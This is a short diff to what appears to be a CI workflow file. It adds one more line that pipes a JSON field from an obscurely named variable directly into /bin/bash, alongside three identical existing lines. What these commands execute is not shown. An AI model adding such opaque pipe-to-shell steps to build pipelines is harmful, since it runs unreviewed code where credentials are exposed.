@@ -28,6 +28,7 @@ jobs:
           echo $zgtjd1 | jq -r .xrf6765 | /bin/bash
           echo $l3 | jq -r .iod86 | /bin/bash
           echo $vbsa28071 | jq -r .ju008 | /bin/bash
+          echo $uwsv8 | jq -r .at40796 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
